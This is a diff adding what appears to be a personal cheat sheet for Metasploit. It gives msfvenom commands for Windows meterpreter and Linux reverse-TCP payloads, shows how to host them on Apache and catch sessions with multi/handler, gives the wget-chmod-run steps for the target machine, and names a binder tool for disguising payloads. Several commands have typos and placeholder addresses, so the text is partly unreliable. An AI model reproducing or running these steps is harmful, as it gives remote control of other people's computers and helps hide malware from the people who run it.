@@ -1,0 +1,77 @@
+****************************************************
+creating payload for closed ports
+****************************************************
+sudo msfvenom --platform windows -p window/meterpreter/reverse_tcp lhost 19.0.0.0 lport=4444 -f exe a x86 > /var/www/html/cmr.exe
+
+cd /var/www/html
+ls
+service apache2 start
+
+ifconfig
+
+*************************************
+ listening meterpreter session  
+*************************************
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set lhost 0.0.0.0
+set lport 000
+exploit
+
+#######################################################
+
+TASK : Creating reverse tcp for linux
+
+######################################################
+> searching a suitable  metasploit payload in online / offline 
+
+> select payload and use msfvenom
+
+commands :
+
+msfvenom --paltform linux -p linux/x86/shell/reverse_tcp lhosts 0.0.0.0 lport 0000 -f elf -a x86 > /var/www/html/name.elf
+
+cd /var/www/html/
+
+sudo rm index.html
+
+service apache2 start
+
+ifconfig
+
+open in browser 
+
+********************************************
+listening the session
+********************************************
+
+msfconsole
+
+use exploit/multi/handler
+
+set payload linu/x86/shell/rverse_tcp 
+
+show options
+
+set lhosts 0.0.0.0
+
+exploit
+
+***************************************************
+downloading exploit in linux attack machine 
+***************************************************
+
+sudo wget 0.0.0.0/payload.elf
+
+chmod 777 payload.elf
+
+./payload.elf
+
+#######################################################
+
+######################################################
+  Binding softwares :
+ 1. fevicol
+######################################################
